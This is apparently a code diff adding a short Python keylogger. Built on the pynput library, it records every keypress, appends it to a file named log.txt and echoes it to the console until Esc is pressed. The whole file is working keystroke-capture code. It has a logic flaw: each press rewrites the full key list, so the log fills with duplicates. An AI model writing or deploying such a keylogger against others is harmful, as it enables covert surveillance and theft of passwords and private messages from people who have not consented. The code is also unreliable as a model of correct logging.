@@ -1,0 +1,33 @@
+import pynput
+from pynput.keyboard import Listener, Key
+
+keys = []
+
+# Function called when a key is pressed
+def on_press(key):
+    keys.append(key)  # Append the key to the keys list
+    write_file(keys)  # Write the keys to the file
+    try:
+        # Try to print alphanumeric keys
+        print(f'Alphanumeric key {key} pressed')
+    except AttributeError:
+        # Handle special keys (e.g., Shift, Ctrl, etc.)
+        print(f'Special key {key} pressed')
+
+# Function to write the keys to a file
+def write_file(keys):
+    with open('log.txt', 'a') as f:  # Open the log file in append mode
+        for key in keys:
+            k = str(key).replace("'", "")  # Convert the key to string and remove single quotes
+            f.write(k + ' ')  # Write the key followed by a space
+
+# Function called when a key is released
+def on_release(key):
+    print(f'{key} released')
+    # If the Esc key is pressed, stop the listener
+    if key == Key.esc:
+        return False
+
+# Set up the listener to monitor key presses and releases
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()  # Start the listener
